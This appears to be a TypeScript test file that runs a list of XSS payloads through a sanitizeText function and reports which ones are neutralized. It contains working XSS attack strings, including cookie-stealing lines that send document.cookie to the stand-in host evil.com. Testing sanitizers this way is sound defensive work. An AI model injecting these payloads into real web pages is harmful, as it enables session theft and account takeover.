/**
 * P2 XSS Sanitization Verification Tests
 * Run with: npx ts-node --project tsconfig.json tests/xss-verification.ts
 * Or copy to browser console (after importing sanitizeText)
 */

import { sanitizeText, sanitizeForDisplay } from '../src/lib/validation';

// XSS payloads that should be neutralized
const xssPayloads = [
    // Basic script injection
    '<script>alert("xss")</script>',

    // Event handler injection
    '<img src=x onerror=alert("xss")>',
    '<div onmouseover=alert("xss")>hover me</div>',

    // Attribute injection
    '" onclick="alert(\'xss\')" data-x="',
    "' onfocus='alert(1)' autofocus='",

    // JavaScript URL
    '<a href="javascript:alert(1)">click</a>',

    // Data URL
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',

    // Template literal injection
    '`${alert(1)}`',

    // SVG-based XSS
    '<svg onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',

    // Mixed case bypass attempts
    '<ScRiPt>alert(1)</ScRiPt>',
    '<iMg SrC=x oNeRrOr=alert(1)>',

    // Encoded payloads (already decoded by browser)
    '<img src=x onerror="&#97;lert(1)">',

    // NULL byte injection
    '<script\x00>alert(1)</script>',
];

console.log('=== P2 XSS Sanitization Test Results ===\n');

let passed = 0;
let failed = 0;

xssPayloads.forEach((payload, i) => {
    const sanitized = sanitizeText(payload);

    // Check that no executable code remains
    const hasDangerousContent =
        sanitized.includes('<script') ||
        sanitized.includes('onerror') ||
        sanitized.includes('onclick') ||
        sanitized.includes('onload') ||
        sanitized.includes('onmouseover') ||
        sanitized.includes('onfocus') ||
        sanitized.includes('javascript:');

    // Verify all angle brackets are encoded
    const hasRawAngleBrackets = /<|>/.test(sanitized) && !sanitized.includes('&lt;') && !sanitized.includes('&gt;');

    const isSecure = !hasDangerousContent && !hasRawAngleBrackets;

    if (isSecure) {
        console.log(`✅ Test ${i + 1}: PASSED`);
        console.log(`   Input:  ${payload.substring(0, 50)}...`);
        console.log(`   Output: ${sanitized.substring(0, 50)}...\n`);
        passed++;
    } else {
        console.log(`❌ Test ${i + 1}: FAILED`);
        console.log(`   Input:  ${payload}`);
        console.log(`   Output: ${sanitized}`);
        console.log(`   Reason: Contains potentially executable code\n`);
        failed++;
    }
});

console.log('=== Summary ===');
console.log(`Passed: ${passed}/${xssPayloads.length}`);
console.log(`Failed: ${failed}/${xssPayloads.length}`);

if (failed === 0) {
    console.log('\n✅ All XSS payloads successfully neutralized!');
} else {
    console.log('\n❌ Some XSS payloads may still execute!');
    process.exit(1);
}

// Demonstrate specific before/after
console.log('\n=== Before/After Examples ===\n');

const examples = [
    '<script>alert("stolen_cookie:" + document.cookie)</script>',
    '<img src=x onerror="fetch(\'evil.com?c=\'+document.cookie)">',
    '" onclick="location=\'evil.com?c=\'+document.cookie" data-x="',
];

examples.forEach(ex => {
    console.log('BEFORE (dangerous):');
    console.log(`  ${ex}`);
    console.log('AFTER (safe):');
    console.log(`  ${sanitizeText(ex)}`);
    console.log('');
});
